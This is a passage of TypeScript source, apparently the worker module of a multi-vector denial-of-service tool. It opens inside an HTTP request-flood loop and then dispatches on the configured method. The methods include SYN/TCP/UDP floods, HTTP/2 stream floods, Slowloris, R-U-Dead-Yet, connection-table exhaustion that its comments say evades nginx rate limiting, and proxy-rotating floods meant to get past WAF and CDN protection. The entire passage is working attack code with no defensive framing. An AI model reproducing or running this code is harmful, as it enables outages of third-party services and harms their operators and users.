  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const method = METHS[randInt(0, METHS.length)];
    const path   = PATHS[randInt(0, PATHS.length)];
    const body   = getHeavy();
    let url: string;
    try { const u = new URL(base); u.pathname = path; u.searchParams.set("_", randStr(8)); url = u.toString(); }
    catch { url = `${base}${path}?_=${randStr(8)}`; }
    const h = buildHeaders(true, body.length);

    fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(6000), keepalive: false })
      .then(res => { inflight--; localPkts++; localBytes += body.length + 300; res.body?.cancel().catch(() => {}); })
      .catch(() => { inflight--; localPkts++; localBytes += body.length * 0.8 | 0; });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 2));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 60)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number) => { parentPort?.postMessage({ pkts: p, bytes: b }); };

// ── Worker entry — handle all errors gracefully ────────────────────────
const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const UDP = new Set(["udp-flood","udp-bypass"]);

async function runWorker() {
  const resolvedHost = await resolveHost(hostname).catch(() => hostname);

  if (UDP.has(cfg.method)) {
    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (L4.has(cfg.method)) {
    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "geass-override") {
    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
    // Kept as fallback for direct worker invocation
    const pipeT = Math.ceil(cfg.threads * 0.50);
    const tcpT  = Math.ceil(cfg.threads * 0.25);
    const udpT  = cfg.threads - pipeT - tcpT;
    await Promise.all([
      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
    ]);

  } else if (cfg.method === "http2-flood") {
    // Native HTTP/2 with multiplexed streams (node:http2)
    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slowloris") {
    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "conn-flood") {
    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
    // Bypasses nginx rate limiting completely (limit_req never triggered)
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "rudy") {
    // R-U-Dead-Yet: POST with huge content-length, body trickled slowly
    await runHTTPExhaust(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "http-bypass") {
    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
    await runHTTPFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-flood") {
    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
    // Falls back to raw pipeline when no proxies (max throughput)
    const proxies = cfg.proxies ?? [];
    if (proxies.length > 0) {
      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
    } else {
      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
    }

  } else {
    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
  }
}

runWorker()
  .catch(() => { /* swallow all errors — worker exits cleanly */ })
  .finally(() => {
    parentPort?.postMessage({ done: true });
  });
